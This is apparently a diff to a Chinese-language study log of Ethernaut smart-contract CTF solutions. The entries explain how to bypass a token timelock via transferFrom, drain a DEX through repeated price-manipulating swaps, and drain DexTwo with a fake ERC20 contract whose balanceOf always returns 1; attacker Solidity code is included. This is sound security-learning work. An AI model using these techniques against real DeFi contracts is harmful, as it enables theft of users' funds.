@@ -195,5 +195,46 @@ contract BuyerImpl {
 }
 ```
 
+### 2024.09.06
+#### Ethernaut - Naught Coin
+单纯看合约没啥问题，不过合约继承了 ERC20 合约，该合约还有其它转账的方法，比如 TransferFrom
+可以用 TransferFrom 进行转账，不会走到 lockTokens 的逻辑
+
+### 2024.09.07
+#### Ethernaut - Recovery
+不是很懂这题要考察什么？考察如何提前计算合约地址？反正是从浏览器中找到了合约地址，调用了自毁方法，就通过了...
+
+### 2024.09.08
+#### Ethernaut - Dex
+这题的 getSwapPrice 方法有问题，会用交易前的价格执行整个交易，实际交易时会有滑点问题。
+只需要不断用一种资产换另一种资产，再用另一种资产换回原来资产这种方式，就能消耗完 Dex 中所有代表
+
+### 2024.09.09
+#### Ethernaut - DexTwo
+根据题目提示，能够发现 Dex 合约在进行swap时，没有判断交易的是否是题目创建的两个合约。
+我们能够构建一个有问题的合约，去把 Dex 创建的两个代币合约中的代币偷出来。
+实例地址：0xEd4F4dDf2D09A4c3b98bC8176970329a9cA4943E
+```
+contract SwappableTokenTwo is ERC20 {
+    address private _dex;
+
+    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
+        ERC20(name, symbol)
+    {
+        _mint(msg.sender, initialSupply);
+        _dex = dexInstance;
+    }
+
+    function approve(address owner, address spender, uint256 amount) public {
+        require(owner != _dex, "InvalidApprover");
+        super._approve(owner, spender, amount);
+    }
+
+    function balanceOf(address account) public pure override  returns (uint256) {
+        return uint256(1);
+    }
+}
+```
+
 
 <!-- Content_END -->
